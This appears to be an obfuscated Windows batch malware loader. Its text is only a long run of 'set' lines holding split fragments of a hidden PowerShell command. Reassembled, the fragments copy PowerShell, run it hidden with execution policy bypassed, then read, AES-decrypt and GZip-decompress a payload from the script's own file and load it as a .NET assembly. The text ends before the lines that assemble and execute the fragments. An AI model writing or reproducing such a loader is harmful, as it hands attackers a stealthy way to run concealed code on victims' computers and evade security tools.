@echo off
set "cciErlDgYY=:\"
set "XfmiZrmgvU=0\"
set "BFnyNmKDNS=.e"
set "bUuPAQXDXD=\v"
set "AFjoEHUJPw=Sy"
set "qGShCjPGSW=we"
set "KgqCizOFFY=ll"
set "GzHPOrgjfH=po"
set "muiyOUmubz=nd"
set "SPTvfXRazZ=ws"
set "gtOdbWHmPj=rs"
set "fjoimrnfFQ=ll"
set "uUZSvvFECF=py"
set "SzGEVHWOwN=s\"
set "ERidWvUBVs=he"
set "YyXoZmRHfJ=32"
set "kYJTNdAyFR=in"
set "ICGZHYDJpJ=y "
set "TqgIyAlQyT=do"
set "yCIDtuenNQ=rS"
set "JsHwVLRFUA=Wi"
set "yxMARceKzt=co"
set "VBqJKltuQC=1."
set "ZDkryrkdOQ= C"
set "ZjfygJwYfD=st"
set "LsboPgVWFK=we"
set "ooLzRWfGRK= /"
set "RaVJrsLuAj=ow"
set "mAYGxnjPKx=he"
set "ZweKIMNEDh=em"
set "tGgrXaPeAW=Po"
set "xcFekJthxm=\W"
set "JTtWdyyPkg=xe"
set "EImZygWTZe= %~dp0"
set "YteCLlXbKu=cd"
set "KFGhSSvHCt=brea"
set "CvnZPkaAJQ=KeO."
set "SBLpxWPRFC=, $L"
set "iOExzUgwaZ==');"
set "LExpGPyDBN=KaHd"
set "aYKRiltTSx=[Sys"
set "ICxwKCVErv=yste"
set "VkMHwEVrML=7;$c"
set "rioGlOLitQ=Pa.T"
set "apIKIDXWma=m.IO"
set "FTNCYgiOXO=bjec"
set "chZwLBZXfh=]::C"
set "IxYjnkDigX== $c"
set "XdNeddjede=uLI."
set "YRSXrUvKsf=join"
set "uRPnHKKzlN=-nop"
set "FSWDIqgwnl=).Sp"
set "zBOVaKzTWY=esMa"
set "CtbYJMjRMp=($ig"
set "SvflhtAIKm=join"
set "RTkDTElgox=tsWi"
set "yjGNyXzYgV=and "
set "dNxuFeouRk=[Sys"
set "sPrHltxRLz=.Len"
set "XaBLyxvwyM=rtS4"
set "AbnSOybzUO= = $"
set "YkBEKSNRzZ=3); "
set "JWyZEtzHzC=ptog"
set "WnuSxOGlmN=Bmor"
set "DORmyzNxRy=mory"
set "XjcdsScaqO=.Ass"
set "rsDyDboTFG===')"
set "esfIIzUwYf=$JpG"
set "IvtRunkpeB=in $"
set "fAsHylGMdk=PKCS"
set "MXGdxalyOB=FcNh"
set "ptowHcfArO= [Sy"
set "xDbWvyqCIH=Invo"
set "JfpQrNMvbx=t Sy"
set "BXkPPWkoAv=ress"
set "HMhooKCLkr=LmuD"
set "QuQiNeYdcW=.Dis"
set "odTTSbBpdf=THxh"
set "agPhbMJkcB=ecry"
set "cdwMeGxTGD=:('g"
set "HpicoZJdXp=.IO."
set "vwWKUbXMtS=OcgP"
set "EMrgTcGlWh=lBlo"
set "LnVUYvggqf=Stre"
set "ojCjrBszHn=; };"
set "eVapBCQsaa=('ev"
set "sAWJGskCnz=File"
set "LZsYlLciTu=m.IO"
set "jRrpKedIYY=esaB"
set "FigDcaeZLa=$bNm"
set "osKhqtNfuv=KaHd"
set "LTdrgpSFZd=bstr"
set "HXUDUbiRKN=CuSj"
set "cBgtPaicbK=:: '"
set "EBkAYqwXoF= [st"
set "FaiURXHTCF=stem"
set "OheDqoXPXW=nirt"
set "esayDFLWEk=raph"
set "okIWGBFXZA=Hd.I"
set "HUqbmBNoqB=ert]"
set "FDDMCFLFQq=1] -"
set "iCvneEqwKq=f.Su"
set "MnYGQYlJZT=pStr"
set "xmktrLFUZw=cgPq"
set "cxocxGEosn=ct S"
set "yhnPKeJlye=]::("
set "vJMfnjnfga=[Sys"
set "qyFTJqxMTG='[-1"
set "xTbZrausVn=)))"
set "Baqxtzbtsj=daeR"
set "kdMIiHQekU=fore"
set "IvUllxbPmt=sion"
set "GBoLYzGLwY=pher"
set "XPbJuovohP=y]::"
set "ziudpzcDDt=pose"
set "nmlKukcgZu=yvhu"
set "HfwpqcpAnf='gni"
set "HYIPWYOuwc=.GZi"
set "OhXaOtdNhe=ispo"
set "YNOIZrsmzs=pres"
set "UmXYqualVq=ress"
set "vYBtdeqtVA=e]::"
set "SFOZysrzhi=8kuY"
set "OZVBCCclIB=);$c"
set "bJrWJfIBzv=q = "
set "sQIBMtDqrA=eam("
set "rjCbWLkhXE=New-"
set "JewyMjfbkg=bypa"
set "IEyPgISqKN=);$O"
set "JtQrFocWQM=yTo("
set "TcADPfwEpR=vert"
set "MvgdnFEcVe=.Con"
set "XsDqTKmqgs=morF"
set "BafixPTCYb=embl"
set "QjjLWTKdfU=-joi"
set "ZvPoeLCDWS=stem"
set "sFfSQJtxRx=y.Pa"
set "uLSjdKwyEQ=n ''"
set "tWOTEDpysu=();$"
set "IIbsLQRKIQ=m(, "
set "RHbrqThQNq=] -j"
set "kbuHVlCZDA=ring"
set "hgELJONHUO=[-1."
set "VbkeFKeVeI=Secu"
set "lazCkYtsRA=e = "
set "ZILJenQSkn=Disp"
set "rJOAevIIuN=muDt"
set "vNHjxtbAdc=('%*'"
set "kAiwbYtswc=t = "
set "zXffWBtbWG=Disp"
set "umRVnGSvBa=1..-"
set "LXViFeVSZb=Comp"
set "xlmtNXuQKF=R5jf"
set "GvbaoeBYOs=$Lmu"
set "SsVGSbCgWf=Obje"
set "sbDbwzzfHL=TllA"
set "hVOKWpUzWp=oryS"
set "eCMIRdwcpU=.Key"
set "DBhdbgqhTA=ing("
set "UxkSIPIqIc=]::("
set "uWmMBlEnGc=.Mod"
set "HeRHGRQtWG=2VUN"
set "aLQbtfpYuu=New-"
set "xtNxeJgCjL=ct S"
set "vzaijEKTLa=y.Cr"
set "TPSHRCykQK=mtQ."
set "hQFgFSSVFb=raph"
set "pjxzxYhATX=Conv"
set "iPjNvUdTiL=;$RZ"
set "VNqlbhPgBA=)($L"
set "kPrJEyKmlw='[-1"
set "syzTReRxQJ=am;$"
set "GbckPZklhH='txe"
set "MhXrKjxcJt=oArr"
set "wOTBLQTrmt=-4] "
set "WOpHGgiWMy=);$c"
set "JwmLjzXjfs=ptog"
set "nJzBnqaJGJ=tion"
set "outMEAOOXe=ay()"
set "RfuTPclBln=;$FR"
set "RsSldjRHun=.Cre"
set "nkYFpKnELp=xqW "
set "lrQsaRphdD=[IO."
set "VOhDKoUhuw=.Cry"
set "mkgOBzbPWD=::('"
set "DhHKYSEdXR=IoO3"
set "RiuswCXOgn=rity"
set "XUpRwEpWeF=;$jI"
set "bOaRyFOmsW=, (,"
set "PxBCXGXsWJ=.Com"
set "JwlFddwTNc=$Ocg"
set "NwRsgsXgjw=ck($"
set "AHFSPullkH=t = "
set "XYZvklzjRY=hy.A"
set "zhtusGkpnb=();$"
set "vycWxEguEQ=Comp"
set "nBmtEsKZwZ=kyhK"
set "njdIqYJXbS=flec"
set "LIEAonHpYd=Dt ="
set "XFvEzODSet=aDNK"
set "whAWepJpyG=uLI "
set "vpXuIKGVqP=yste"
set "iTcSndtMcQ=onve"
set "rPvZXPVCui='')("
set "ZjNBWYfiNV=tryP"
set "ZidJMgJRTo=LmuD"
set "sGjLVoPXXd=Fina"
set "hYuFgwElsk=..-1"
set "VQaiENUTqd=('%~f0'"
set "TAMXuHLjAA=comp"
set "EOJNfejbXS=gMod"
set "sdnKyyMHwk=form"
set "QdlMHeDXIk=ionM"
set "bmobDqtlgL=tem."
set "BjiYMcHtwH=g = "
set "FNzTPbgOTx=ach "
set "mMoQMyuWjQ=ss -"
set "JATqPeVBHd=rt]:"
set "kCHWoFyIcM=Mode"
set "PVqjUTVzul=F'[-"
set "PanaOpknux=6esa"
set "xwEBLBdxPr= [Sy"
set "kAyxwpULMO=comm"
set "xwYMWlmUWy= = ["
set "IUmzfphPsh=-joi"
set "djcUGiAiOS= = N"
